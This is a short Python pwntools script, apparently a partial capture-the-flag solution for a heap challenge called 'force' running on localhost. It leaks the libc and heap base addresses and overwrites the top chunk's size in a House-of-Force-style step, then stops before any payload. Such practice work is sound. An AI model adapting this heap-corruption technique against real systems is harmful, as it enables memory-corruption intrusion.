from pwn import *

p = remote('localhost', 7777)
# p = process('./force')
libc = ELF('./.glibc/glibc_2.28_no-tcache/libc.so.6')

def create(size, data):
    p.sendlineafter(b'Surrender\n', b'1')
    p.sendlineafter(b'?: ', str(size))
    p.sendlineafter(b'?: ', data)

p.recvuntil(b'at ')
libc.address = int(p.recvline()[:-1], 16) - libc.symbols['system']
log.info(hex(libc.address))
p.recvuntil(b'at ')
heap = int(p.recvline()[:-1], 16)
log.info(hex(heap))

create(0x18, b'A'*0x18+p64(0xfe1))
create(0xfd8, b'B')
# p.interactive()
